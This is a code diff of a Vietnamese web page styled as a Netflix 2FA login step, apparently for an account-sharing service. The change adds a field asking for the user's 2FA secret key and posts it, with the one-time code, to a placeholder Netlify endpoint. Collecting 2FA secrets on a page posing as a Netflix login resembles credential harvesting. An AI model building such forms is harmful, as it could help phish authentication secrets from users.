@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Netflix Account Share - 2FA</title>
+    <title>Nhập Mã 2FA để Đăng Nhập Netflix</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -53,10 +53,14 @@
     </style>
 </head>
 <body>
-    <h1>Nhập Mã 2FA</h1>
+    <h1>Nhập Mã 2FA để Đăng Nhập Netflix</h1>
     <form id="2faForm">
+        <label for="2faKey">Khóa 2FA:</label>
+        <input type="text" id="2faKey" name="2faKey" required placeholder="Nhập khóa 2FA của bạn">
+        
         <label for="2faCode">Mã 2FA:</label>
         <input type="text" id="2faCode" name="2faCode" required placeholder="Nhập mã 2FA">
+        
         <button type="submit">Xác thực</button>
     </form>
 
@@ -65,22 +69,22 @@
     <script>
         document.getElementById('2faForm').addEventListener('submit', function(event) {
             event.preventDefault();
+            const key = document.getElementById('2faKey').value;
             const code = document.getElementById('2faCode').value;
 
-            // Gửi mã 2FA đến backend (Netlify Function)
             fetch('https://your-netlify-site.netlify.app/.netlify/functions/verify-2fa', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify({ code: code }),
+                body: JSON.stringify({ key: key, code: code }),
             })
             .then(response => response.json())
             .then(data => {
                 document.getElementById('responseMessage').innerText = data.message;
                 if (data.success) {
-                    // Nếu mã 2FA hợp lệ, có thể redirect hoặc hiển thị thông tin tài khoản Netflix
-                    window.location.href = '/account-details'; // Thay đổi đường dẫn đến trang thông tin tài khoản
+                    // Redirect to Netflix account details or show them here
+                    window.location.href = '/account-details'; // Redirect đến trang tài khoản Netflix
                 }
             })
             .catch(error => {
